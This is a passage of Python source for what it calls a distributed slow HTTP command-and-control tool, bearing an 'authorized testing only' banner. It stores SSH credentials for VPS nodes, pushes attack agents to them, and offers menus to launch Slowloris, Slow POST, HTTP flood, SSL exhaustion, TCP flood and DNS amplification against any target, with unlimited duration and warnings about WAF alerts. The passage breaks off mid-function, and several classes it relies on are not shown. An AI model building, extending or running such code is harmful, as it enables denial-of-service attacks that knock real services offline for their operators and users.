#!/usr/bin/env python3
"""
Distributed Slow HTTP Testing C2 - Advanced Edition
Author: Security Research Tool
Purpose: Educational and Authorized Penetration Testing Only

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import sqlite3
import threading
import json
import time
import os
import sys
import signal
import socket
import random
import string
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import base64
import logging
import hashlib
import re
import ipaddress
import select
import argparse
import urllib.parse
from urllib.parse import urlparse
import ssl
import struct
import queue
import tempfile
import platform
import shutil
import traceback

# Try to import optional dependencies
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[WARNING] cryptography module not found. Password encryption will be limited.")

try:
    import paramiko
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False
    print("[WARNING] paramiko module not found. SSH functionality will be limited.")

try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init(autoreset=True)
    COLOR_AVAILABLE = True
except ImportError:
    COLOR_AVAILABLE = False
    print("[WARNING] colorama module not found. Color output will be disabled.")

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("[WARNING] psutil module not found. System monitoring will be limited.")

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[WARNING] requests module not found. Some network features will be limited.")

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    print("[WARNING] dnspython module not found. DNS features will be limited.")

# Ensure logs directory exists
os.makedirs("logs", exist_ok=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f"logs/slowhttp_c2_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("SlowHTTP-C2")

# Version information
VERSION = "4.0"
BUILD_DATE = "2025-09-27"

class Colors:
    """ANSI color codes for terminal output"""
    if COLOR_AVAILABLE:
        RED = Fore.RED
        GREEN = Fore.GREEN
        YELLOW = Fore.YELLOW
        BLUE = Fore.BLUE
        PURPLE = Fore.MAGENTA
        CYAN = Fore.CYAN
        WHITE = Fore.WHITE
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        RESET = Style.RESET_ALL
    else:
        RED = GREEN = YELLOW = BLUE = PURPLE = CYAN = WHITE = BOLD = DIM = RESET = ""

class SecurityManager:
    """Handles security operations like encryption and validation"""
    
    def __init__(self):
        """Initialize security manager with encryption key"""
        self.key_file = 'key.key'
        
        if CRYPTO_AVAILABLE:
            if os.path.exists(self.key_file):
                try:
                    with open(self.key_file, 'rb') as f:
                        self.key = f.read()
                except Exception as e:
                    logger.error(f"Failed to read key file: {str(e)}")
                    self._generate_new_key()
            else:
                self._generate_new_key()
                
            try:
                self.cipher = Fernet(self.key)
            except Exception as e:
                logger.error(f"Failed to initialize cipher: {str(e)}")
                self.cipher = None
        else:
            self.key = None
            self.cipher = None
            logger.warning("Cryptography module not available. Using fallback encryption.")
    
    def _generate_new_key(self):
        """Generate a new encryption key"""
        try:
            self.key = Fernet.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(self.key)
            os.chmod(self.key_file, 0o600)  # Secure permissions
            logger.info("Generated new encryption key")
        except Exception as e:
            logger.error(f"Failed to generate new key: {str(e)}")
            self.key = None
    
    def encrypt_password(self, password):
        """Encrypt password with proper error handling"""
        if not password:
            return ""
            
        try:
            if CRYPTO_AVAILABLE and self.cipher:
                return base64.b64encode(self.cipher.encrypt(password.encode())).decode()
            else:
                # Fallback encryption (not secure, but better than plaintext)
                salt = os.urandom(16)
                key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
                return base64.b64encode(salt + key).decode()
        except Exception as e:
            logger.error(f"Encryption error: {str(e)}")
            # Return a special marker for encryption failure
            return f"ENCRYPTION_FAILED_{int(time.time())}"
    
    def decrypt_password(self, encrypted_password):
        """Decrypt password with comprehensive error handling"""
        if not encrypted_password:
            return ""
            
        if encrypted_password.startswith("ENCRYPTION_FAILED_"):
            logger.error("Attempted to decrypt a failed encryption marker")
            return ""
            
        try:
            if CRYPTO_AVAILABLE and self.cipher:
                return self.cipher.decrypt(base64.b64decode(encrypted_password.encode())).decode()
            else:
                # This is just a placeholder - in reality, you can't decrypt the fallback method
                # It would need to be replaced with a proper implementation
                logger.warning("Attempted to decrypt with fallback method - not supported")
                return ""
        except Exception as e:
            logger.error(f"Decryption error: {str(e)}")
            return ""
    
    def hash_data(self, data):
        """Create a secure hash of data"""
        if not data:
            return ""
        try:
            return hashlib.sha256(str(data).encode()).hexdigest()
        except Exception as e:
            logger.error(f"Hashing error: {str(e)}")
            return ""
    
    def validate_ip(self, ip):
        """Validate if string is a valid IP address"""
        if not ip:
            return False
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def validate_port(self, port):
        """Validate if value is a valid port number"""
        try:
            port_num = int(port)
            return 1 <= port_num <= 65535
        except (ValueError, TypeError):
            return False
    
    def validate_url(self, url):
        """Validate if string is a valid URL"""
        if not url:
            return False
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False
    
    def sanitize_input(self, input_str, max_length=None):
        """Sanitize user input to prevent injection attacks"""
        if not input_str:
            return ""
        
        # Remove dangerous characters
        sanitized = re.sub(r'[;\'"\\]', '', str(input_str))
        
        # Limit length if specified
        if max_length and len(sanitized) > max_length:
            sanitized = sanitized[:max_length]
            
        return sanitized

def main():
    """Main function to run the application"""
    # Check Python version
    if sys.version_info < (3, 6):
        print("Python 3.6+ required")
        sys.exit(1)
    
    # Create necessary directories
    os.makedirs('logs', exist_ok=True)
    
    # Initialize and run TUI
    try:
        print("Starting Distributed Slow HTTP C2 - ADVANCED EDITION...")
        tui = SlowHTTPTUI()
        tui.run()
    except Exception as e:
        logger.critical(f"Fatal error: {str(e)}")
        logger.critical(traceback.format_exc())
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()

class SlowHTTPTUI:
    """Terminal User Interface for SlowHTTP C2 tool with improved monitoring"""
    
    def __init__(self):
        """Initialize the TUI with all required components"""
        self.security_manager = SecurityManager()
        self.db_manager = DatabaseManager()
        self.ssh_manager = SSHManager(self.security_manager)
        self.attack_manager = AttackManager(self.ssh_manager, self.db_manager)
        self.network_tools = NetworkTools()
        self.terminal = TerminalHelper()
        self.running = True
        
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        """Handle interrupt signals"""
        print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
        
        # Stop all active attacks
        for session_id in list(self.attack_manager.active_attacks.keys()):
            self.attack_manager.stop_attack(session_id)
        
        # Close SSH connections
        for ip in list(self.ssh_manager.connections.keys()):
            self.ssh_manager.disconnect_vps(ip)
        
        # Close database connections
        self.db_manager.close()
        
        self.running = False
        print(f"{Colors.GREEN}Goodbye!{Colors.RESET}")
        sys.exit(0)
    
    def print_main_menu(self):
        """Print the main menu"""
        menu = f"""
{Colors.BOLD}MAIN MENU:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} VPS Management
{Colors.GREEN}[2]{Colors.RESET} Launch Attack
{Colors.GREEN}[3]{Colors.RESET} Monitor Active Attacks  
{Colors.GREEN}[4]{Colors.RESET} Attack History
{Colors.GREEN}[5]{Colors.RESET} Network Reconnaissance Tools
{Colors.GREEN}[6]{Colors.RESET} System Status
{Colors.GREEN}[0]{Colors.RESET} Exit

{Colors.YELLOW}Select option (0-6): {Colors.RESET}"""
        print(menu)
    
    def vps_management_menu(self):
        """VPS management menu"""
        while self.running:
            self.terminal.clear_screen()
            self.terminal.print_banner(VERSION)
            
            vps_list = self.db_manager.get_all_vps()
            
            print(f"{Colors.BOLD}VPS MANAGEMENT{Colors.RESET}")
            print("=" * 50)
            
            if vps_list:
                # Convert to list of lists for table printing
                headers = ["ID", "IP Address", "Username", "Status", "Location", "Last Seen"]
                data = []
                
                for vps in vps_list:
                    status = vps['status']
                    status_str = f"{Colors.GREEN}{status}{Colors.RESET}" if status == 'online' else f"{Colors.RED}{status}{Colors.RESET}"
                    last_seen = vps['last_seen'][:19] if vps['last_seen'] else 'Never'
                    data.append([
                        vps['id'],
                        vps['ip_address'],
                        vps['username'],
                        status_str,
                        vps['location'] or 'Unknown',
                        last_seen
                    ])
                
                self.terminal.print_table(headers, data)
            else:
                print(f"\n{Colors.YELLOW}No VPS nodes configured{Colors.RESET}")
            
            menu = f"""
{Colors.BOLD}VPS OPERATIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Add VPS Node
{Colors.GREEN}[2]{Colors.RESET} Test All Connections
{Colors.GREEN}[3]{Colors.RESET} Deploy Agents to All
{Colors.GREEN}[4]{Colors.RESET} Remove VPS Node
{Colors.GREEN}[5]{Colors.RESET} Test Single VPS
{Colors.GREEN}[6]{Colors.RESET} View VPS Details
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-6): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.add_vps()
            elif choice == '2':
                self.test_all_connections()
            elif choice == '3':
                self.deploy_all_agents()
            elif choice == '4':
                self.remove_vps()
            elif choice == '5':
                self.test_single_vps()
            elif choice == '6':
                self.view_vps_details()
            elif choice == '0':
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
    
    def add_vps(self):
        """Add a new VPS node"""
        print(f"\n{Colors.BOLD}ADD NEW VPS NODE{Colors.RESET}")
        print("-" * 25)
        
        try:
            # Validate IP address
            def validate_ip(ip):
                return self.security_manager.validate_ip(ip), "Invalid IP address format"
                
            # Validate port number
            def validate_port(port):
                try:
                    port_num = int(port)
                    if 1 <= port_num <= 65535:
                        return True, ""
                    return False, "Port must be between 1 and 65535"
                except ValueError:
                    return False, "Port must be a number"
            
            ip = self.terminal.input_with_prompt("IP Address: ", validate_func=validate_ip)
            if not ip:
                return
            
            username = self.terminal.input_with_prompt("SSH Username: ")
            if not username:
                return
            
            password = self.terminal.input_with_prompt("SSH Password: ")
            if not password:
                return
            
            port = self.terminal.input_with_prompt("SSH Port (default 22): ", False, validate_port) or "22"
            port = int(port)
            
            location = self.terminal.input_with_prompt("Location (optional): ", False) or "Unknown"
            
            tags = self.terminal.input_with_prompt("Tags (comma-separated, optional): ", False)
            tags_list = [tag.strip() for tag in tags.split(',')] if tags else []
            
            encrypted_password = self.security_manager.encrypt_password(password)
            
            vps_id, message = self.db_manager.add_vps(ip, username, encrypted_password, port, location, tags_list)
            if vps_id:
                print(f"{Colors.GREEN}[SUCCESS] VPS added to database{Colors.RESET}")
                
                # Test connection
                print(f"{Colors.YELLOW}[INFO] Testing connection...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                status = 'online' if success else 'offline'
                self.db_manager.update_vps_status(ip, status)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.RESET}")
                    
                    # Get system info
                    print(f"{Colors.YELLOW}[INFO] Gathering system information...{Colors.RESET}")
                    system_info = self.ssh_manager.get_system_info(ip)
                    if system_info:
                        self.db_manager.update_vps_system_info(ip, system_info)
                        print(f"{Colors.GREEN}[SUCCESS] System information collected{Colors.RESET}")
                        
                        # Display system info
                        print(f"\n{Colors.BOLD}SYSTEM INFORMATION:{Colors.RESET}")
                        for key, value in system_info.items():
                            print(f"  {key.capitalize()}: {value}")
                else:
                    print(f"{Colors.RED}[ERROR] Connection test failed: {message}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] {message}{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error adding VPS: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("Press Enter to continue...")
    
    def test_all_connections(self):
        """Test connections to all VPS nodes"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to test{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TESTING ALL VPS CONNECTIONS{Colors.RESET}")
        print("-" * 50)
        
        online_count = 0
        for vps in vps_list:
            ip, username, encrypted_password, port = vps['ip_address'], vps['username'], vps['password'], vps['ssh_port']
            print(f"{Colors.CYAN}[TESTING] {ip}:{port}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port, timeout=10)
            
            if success:
                # Test command execution
                cmd_success, cmd_output = self.ssh_manager.execute_command(ip, "echo 'test' && python3 --version", timeout=10)
                if cmd_success:
                    print(f"{Colors.GREEN}ONLINE{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'online', "Connection and command execution successful")
                    online_count += 1
                    
                    # Update system info
                    system_info = self.ssh_manager.get_system_info(ip)
                    if system_info:
                        self.db_manager.update_vps_system_info(ip, system_info)
                else:
                    print(f"{Colors.YELLOW}CONNECTED BUT CMD FAILED{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'online', "Connected but command execution failed")
            else:
                print(f"{Colors.RED}OFFLINE - {message[:50]}{Colors.RESET}")
                self.db_manager.update_vps_status(ip, 'offline', f"Connection failed: {message[:100]}")
        
        print(f"\n{Colors.BOLD}Summary: {online_count}/{len(vps_list)} VPS online{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def deploy_all_agents(self):
        """Deploy attack agents to all online VPS nodes"""
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps['status'] == 'online']
        
        if not online_vps:
            print(f"{Colors.YELLOW}[INFO] No online VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}DEPLOYING AGENTS TO ALL ONLINE VPS{Colors.RESET}")
        print("-" * 50)
        
        # Ask for agent type
        print(f"\n{Colors.BOLD}SELECT AGENT TYPE:{Colors.RESET}")
        print(f"{Colors.GREEN}[1]{Colors.RESET} Standard Agent (Slowloris, Slow POST, Slow Read)")
        print(f"{Colors.GREEN}[2]{Colors.RESET} Advanced Agent (+ HTTP Flood, SSL Exhaust, TCP Flood)")
        
        agent_choice = self.terminal.input_with_prompt("Select agent type [1]: ", False) or "1"
        agent_type = "advanced" if agent_choice == "2" else "standard"
        
        successful_deployments = 0
        for vps in online_vps:
            ip = vps['ip_address']
            print(f"{Colors.CYAN}[DEPLOYING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.deploy_agent(ip, agent_type)
            
            if success:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                successful_deployments += 1
            else:
                print(f"{Colors.RED}FAILED - {message}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[SUMMARY] {successful_deployments}/{len(online_vps)} agents deployed successfully{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def remove_vps(self):
        """Remove a VPS node"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to remove{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}REMOVE VPS NODE{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps['ip_address']} ({vps['location'] or 'Unknown'})")
        
        try:
            choice = self.terminal.input_with_prompt("Select VPS number to remove: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                
                confirm = input(f"{Colors.YELLOW}Remove VPS {vps['ip_address']}? (y/N): {Colors.RESET}").strip().lower()
                
                if confirm == 'y':
                    # Disconnect if connected
                    self.ssh_manager.disconnect_vps(vps['ip_address'])
                    
                    # Remove from database
                    if self.db_manager.remove_vps(vps['ip_address']):
                        print(f"{Colors.GREEN}[SUCCESS] VPS removed{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[ERROR] Failed to remove VPS{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def test_single_vps(self):
        """Test connection to a single VPS node"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TEST SINGLE VPS{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps['ip_address']} ({vps['username']}@{vps['ip_address']}:{vps['ssh_port']})")
        
        try:
            choice = self.terminal.input_with_prompt("Select VPS number: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                ip, username, encrypted_password, port = vps['ip_address'], vps['username'], vps['password'], vps['ssh_port']
                
                print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection established{Colors.RESET}")
                    
                    # Test command execution
                    print(f"{Colors.CYAN}[TESTING] Command execution...{Colors.RESET}")
                    success, output = self.ssh_manager.execute_command(ip, "whoami && pwd && python3 --version")
                    
                    if success:
                        print(f"{Colors.GREEN}[SUCCESS] Command execution test passed{Colors.RESET}")
                        print(f"Output: {output}")
                        
                        # Test network connectivity
                        print(f"{Colors.CYAN}[TESTING] Network connectivity...{Colors.RESET}")
                        success, output = self.ssh_manager.execute_command(ip, "ping -c 3 8.8.8.8 | grep 'time='")
                        
                        if success:
                            print(f"{Colors.GREEN}[SUCCESS] Network connectivity test passed{Colors.RESET}")
                            print(f"Output: {output}")
                        else:
                            print(f"{Colors.RED}[ERROR] Network connectivity test failed: {output}{Colors.RESET}")
                        
                        # Check for agent
                        print(f"{Colors.CYAN}[CHECKING] Attack agent...{Colors.RESET}")
                        success, output = self.ssh_manager.execute_command(ip, "ls -la /tmp/slowhttp_c2/agent.py 2>/dev/null || echo 'Not found'")
                        
                        if success and "Not found" not in output:
                            print(f"{Colors.GREEN}[SUCCESS] Attack agent found{Colors.RESET}")
                            
                            # Test agent
                            print(f"{Colors.CYAN}[TESTING] Attack agent...{Colors.RESET}")
                            success, output = self.ssh_manager.execute_command(ip, "cd /tmp/slowhttp_c2 && python3 agent.py --help | head -5")
                            
                            if success:
                                print(f"{Colors.GREEN}[SUCCESS] Attack agent is working{Colors.RESET}")
                                print(f"Output: {output}")
                            else:
                                print(f"{Colors.RED}[ERROR] Attack agent test failed: {output}{Colors.RESET}")
                        else:
                            print(f"{Colors.YELLOW}[WARNING] Attack agent not found{Colors.RESET}")
                        
                        # Update status
                        self.db_manager.update_vps_status(ip, 'online')
                    else:
                        print(f"{Colors.RED}[ERROR] Command execution failed: {output}{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[ERROR] Connection failed: {message}{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'offline')
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def launch_attack_menu(self):
        """Menu for launching attacks"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps['status'] == 'online']
        
        if not online_vps:
            print(f"{Colors.RED}[ERROR] No online VPS nodes available{Colors.RESET}")
            print(f"{Colors.YELLOW}[INFO] Please add and test VPS nodes first{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"{Colors.BOLD}LAUNCH ATTACK{Colors.RESET}")
        print("=" * 60)
        
        print(f"\n{Colors.GREEN}Available VPS Nodes: {len(online_vps)}{Colors.RESET}")
        for i, vps in enumerate(online_vps, 1):
            print(f"  {i}. {vps['ip_address']} ({vps['location'] or 'Unknown'})")
        
        try:
            # Attack type selection
            print(f"\n{Colors.BOLD}ATTACK TYPE:{Colors.RESET}")
            attack_methods = self.attack_manager.get_available_attack_methods()
            
            for i, (key, name) in enumerate(attack_methods.items(), 1):
                print(f"{Colors.GREEN}[{i}]{Colors.RESET} {name}")
            
            attack_choice = self.terminal.input_with_prompt("Select attack type (1-7): ")
            if not attack_choice or not attack_choice.isdigit():
                return
                
            attack_idx = int(attack_choice) - 1
            if attack_idx < 0 or attack_idx >= len(attack_methods):
                print(f"{Colors.RED}Invalid attack type{Colors.RESET}")
                input("Press Enter to continue...")
                return
                
            attack_type = list(attack_methods.keys())[attack_idx]
            attack_name = attack_methods[attack_type]
            
            # Target configuration
            print(f"\n{Colors.BOLD}TARGET CONFIGURATION:{Colors.RESET}")
            
            # URL validation function
            def validate_url(url):
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                try:
                    result = urlparse(url)
                    if all([result.scheme, result.netloc]):
                        return True, ""
                    return False, "Invalid URL format"
                except:
                    return False, "Invalid URL"
            
            # For DNS amplification, we need an IP address instead of a URL
            if attack_type == 'dns_amplification':
                target_ip = self.terminal.input_with_prompt("Target IP address: ", validate_func=self.security_manager.validate_ip)
                if not target_ip:
                    return
                target_url = target_ip  # Store IP in target_url for consistency
                target_host = target_ip
            else:
                target_url = self.terminal.input_with_prompt("Target URL (e.g., http://target.com): ", validate_func=validate_url)
                if not target_url:
                    return
                
                # Parse and validate target
                if not target_url.startswith(('http://', 'https://')):
                    target_url = 'http://' + target_url
                
                parsed = urlparse(target_url)
                target_host = parsed.netloc
                
                # Offer to gather target information
                print(f"\n{Colors.YELLOW}Would you like to gather information about the target first? (y/N){Colors.RESET}")
                gather_info = input().strip().lower() == 'y'
                
                if gather_info:
                    print(f"\n{Colors.CYAN}[INFO] Gathering target information...{Colors.RESET}")
                    target_info = self.network_tools.gather_target_info(target_host)
                    
                    print(f"\n{Colors.BOLD}TARGET INFORMATION:{Colors.RESET}")
                    print(f"Domain: {target_info['domain']}")
                    print(f"IP Addresses: {', '.join(target_info['ip_addresses'])}")
                    print(f"Web Server: {target_info['web_server'] or 'Unknown'}")
                    print(f"WAF Detected: {Colors.RED if target_info['waf_detected'] else Colors.GREEN}{target_info['waf_detected']}{Colors.RESET}")
                    if target_info['waf_detected']:
                        print(f"WAF Type: {target_info['waf_type'] or 'Unknown'}")
                    print(f"Cloudflare Protected: {Colors.RED if target_info['cloudflare_protected'] else Colors.GREEN}{target_info['cloudflare_protected']}{Colors.RESET}")
                    
                    if target_info['open_ports']:
                        print(f"\nOpen Ports:")
                        for port_info in target_info['open_ports']:
                            print(f"  {port_info['port']}/tcp - {port_info['service']}")
                    
                    # Warning if WAF or Cloudflare is detected
                    if target_info['waf_detected'] or target_info['cloudflare_protected']:
                        print(f"\n{Colors.RED}[WARNING] Target is protected by WAF or Cloudflare.{Colors.RESET}")
                        print(f"{Colors.RED}This may reduce the effectiveness of the attack or trigger alerts.{Colors.RESET}")
                        
                        confirm = self.terminal.input_with_prompt("Continue anyway? (y/N): ", False)
                        if confirm.lower() != 'y':
                            print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
                            input("Press Enter to continue...")
                            return
            
            # VPS selection
            print(f"\n{Colors.BOLD}VPS SELECTION:{Colors.RESET}")
            vps_choice = self.terminal.input_with_prompt("Use all VPS? (Y/n): ", False) or 'y'
            
            if vps_choice.lower() == 'y':
                selected_vps = [vps['ip_address'] for vps in online_vps]
            else:
                print("Select VPS numbers (comma-separated, e.g., 1,2,3):")
                selection = self.terminal.input_with_prompt("VPS selection: ")
                if not selection:
                    return
                
                try:
                    indices = [int(x.strip()) - 1 for x in selection.split(',')]
                    selected_vps = [online_vps[i]['ip_address'] for i in indices if 0 <= i < len(online_vps)]
                except (ValueError, IndexError):
                    print(f"{Colors.RED}Invalid VPS selection{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
            
            if not selected_vps:
                print(f"{Colors.RED}No VPS selected{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Attack parameters
            print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.RESET}")
            
            # Connection validation
            def validate_connections(conn_str):
                try:
                    conn = int(conn_str)
                    if conn < 1:
                        return False, "Connections must be at least 1"
                    return True, ""
                except ValueError:
                    return False, "Connections must be a number"
            
            # Delay validation
            def validate_delay(delay_str):
                try:
                    delay = int(delay_str)
                    if delay < 0:
                        return False, "Delay cannot be negative"
                    return True, ""
                except ValueError:
                    return False, "Delay must be a number"
            
            # Duration validation
            def validate_duration(duration_str):
                try:
                    duration = int(duration_str)
                    if duration < 0:
                        return False, "Duration cannot be negative"
                    return True, ""
                except ValueError:
                    return False, "Duration must be a number"
            
            parameters = {}
            
            if attack_type in ['slowloris', 'slow_post', 'slow_read', 'http_flood', 'ssl_exhaust']:
                connections_str = self.terminal.input_with_prompt("Connections per VPS (default 100): ", False, validate_connections) or "100"
                parameters['connections'] = int(connections_str)
                
                delay_str = self.terminal.input_with_prompt("Delay between packets in seconds (default 15): ", False, validate_delay) or "15"
                parameters['delay'] = int(delay_str)
                
                if attack_type == 'http_flood':
                    requests_str = self.terminal.input_with_prompt("Requests per connection (default 1000): ", False, validate_connections) or "1000"
                    parameters['requests'] = int(requests_str)
            
            duration_str = self.terminal.input_with_prompt("Attack duration in seconds (0 for unlimited): ", False, validate_duration) or "0"
            parameters['duration'] = int(duration_str)
            
            # Attack summary
            print(f"\n{Colors.BOLD}ATTACK SUMMARY:{Colors.RESET}")
            print(f"Target: {Colors.YELLOW}{target_url}{Colors.RESET}")
            print(f"Attack Type: {Colors.YELLOW}{attack_name}{Colors.RESET}")
            print(f"VPS Nodes: {Colors.YELLOW}{len(selected_vps)}{Colors.RESET}")
            
            if 'connections' in parameters:
                print(f"Connections per VPS: {Colors.YELLOW}{parameters['connections']:,}{Colors.RESET}")
                print(f"Total Connections: {Colors.YELLOW}{len(selected_vps) * parameters['connections']:,}{Colors.RESET}")
            
            if 'delay' in parameters:
                print(f"Packet Delay: {Colors.YELLOW}{parameters['delay']}s{Colors.RESET}")
            
            if 'requests' in parameters:
                print(f"Requests per Connection: {Colors.YELLOW}{parameters['requests']:,}{Colors.RESET}")
            
            print(f"Duration: {Colors.YELLOW}{'Unlimited' if parameters['duration'] == 0 else f'{parameters['duration']}s'}{Colors.RESET}")
            
            # Final confirmation
            print(f"\n{Colors.RED}LAUNCH ATTACK? (y/N): {Colors.RESET}", end="")
            confirm = input().strip().lower()
            
            if confirm != 'y':
                print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Create attack session
            session_name = f"{attack_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
            session_id, message = self.db_manager.create_attack_session(
                session_name, target_url, target_host, attack_type, selected_vps, parameters
            )
            
            if not session_id:
                print(f"{Colors.RED}[ERROR] Failed to create attack session: {message}{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Launch attack based on type
            success = False
            
            if attack_type == 'dns_amplification':
                success = self.attack_manager.launch_dns_amplification(session_id, target_host, selected_vps, parameters)
            elif attack_type == 'tcp_flood':
                # For TCP flood, we need a port
                port_str = self.terminal.input_with_prompt("Target port: ", validate_func=self.security_manager.validate_port)
                if not port_str:
                    return
                port = int(port_str)
                success = self.attack_manager.launch_tcp_flood(session_id, target_host, port, selected_vps, parameters)
            else:
                # Standard attack types
                success = self.attack_manager.launch_attack(session_id, target_url, attack_type, selected_vps, parameters)
            
            if success:
                print(f"\n{Colors.GREEN}[SUCCESS] ATTACK LAUNCHED SUCCESSFULLY!{Colors.RESET}")
                print(f"{Colors.CYAN}[INFO] Session ID: {session_id}{Colors.RESET}")
                
                # Auto-start monitoring
                input(f"\n{Colors.YELLOW}Press Enter to start real-time monitoring...{Colors.RESET}")
                self.monitor_attack(session_id)
            else:
                print(f"{Colors.RED}[ERROR] Failed to launch attack{Colors.RESET}")
                input("Press Enter to continue...")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            input("Press Enter to continue...")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error launching attack: {str(e)}")
            logger.error(traceback.format_exc())
            input("Press Enter to continue...")
    
    def monitor_attack(self, session_id=None):
        """Monitor active attacks with improved terminal input handling"""
        if session_id is None:
            # List active attacks
            if not self.attack_manager.active_attacks:
                print(f"{Colors.YELLOW}[INFO] No active attacks to monitor{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            print(f"\n{Colors.BOLD}ACTIVE ATTACKS:{Colors.RESET}")
            for sid, attack_info in self.attack_manager.active_attacks.items():
